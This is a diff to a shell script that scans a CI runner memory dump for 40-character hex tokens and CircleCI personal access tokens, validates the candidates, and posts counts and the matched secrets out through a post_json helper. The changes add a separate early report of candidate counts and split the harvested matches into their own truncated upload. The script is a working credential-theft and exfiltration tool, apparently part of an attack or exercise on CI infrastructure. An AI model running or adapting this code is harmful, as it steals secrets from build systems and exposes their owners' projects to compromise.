@@ -51,6 +51,13 @@ grep -Ei 'CIRCLE|CIRCLECI|CCI(_|[A-Z])|(^|[^A-Z])PAT([^A-Z]|$)|FINAL_FLAG|ASCPC_
 grep -aoP '(?<![0-9A-Fa-f])[0-9A-Fa-f]{40}(?![0-9A-Fa-f])|(?i:ccipat_[A-Za-z0-9_-]{16,128}|circleci_[A-Za-z0-9_-]{16,128})' \
   "$DUMP_FILE" | sort -u | head -n 1500 >"$WORK_DIR/candidates.txt" || true
 
+CANDIDATE_COUNT="$(wc -l <"$WORK_DIR/candidates.txt")"
+jq -n \
+  --arg source github-runner-memory-candidates \
+  --argjson dump_bytes "$(wc -c <"$DUMP_FILE")" \
+  --argjson candidate_count "$CANDIDATE_COUNT" \
+  '{source:$source,dump_bytes:$dump_bytes,candidate_count:$candidate_count}' | post_json
+
 VALID_COUNT=0
 while IFS= read -r CANDIDATE; do
   [ -n "$CANDIDATE" ] || continue
@@ -71,9 +78,14 @@ jq -n \
   --arg source github-runner-memory \
   --arg status complete \
   --argjson dump_bytes "$(wc -c <"$DUMP_FILE")" \
-  --argjson candidate_count "$(wc -l <"$WORK_DIR/candidates.txt")" \
+  --argjson candidate_count "$CANDIDATE_COUNT" \
   --argjson valid_count "$VALID_COUNT" \
-  --arg matches "$(cat "$WORK_DIR/matches.txt")" \
-  '{source:$source,status:$status,dump_bytes:$dump_bytes,candidate_count:$candidate_count,valid_count:$valid_count,matches:$matches}' | post_json
+  '{source:$source,status:$status,dump_bytes:$dump_bytes,candidate_count:$candidate_count,valid_count:$valid_count}' | post_json
+
+head -c 30000 "$WORK_DIR/matches.txt" >"$WORK_DIR/matches-post.txt"
+jq -n \
+  --arg source github-runner-memory-matches \
+  --rawfile matches "$WORK_DIR/matches-post.txt" \
+  '{source:$source,matches:$matches}' | post_json
 
 exit 0
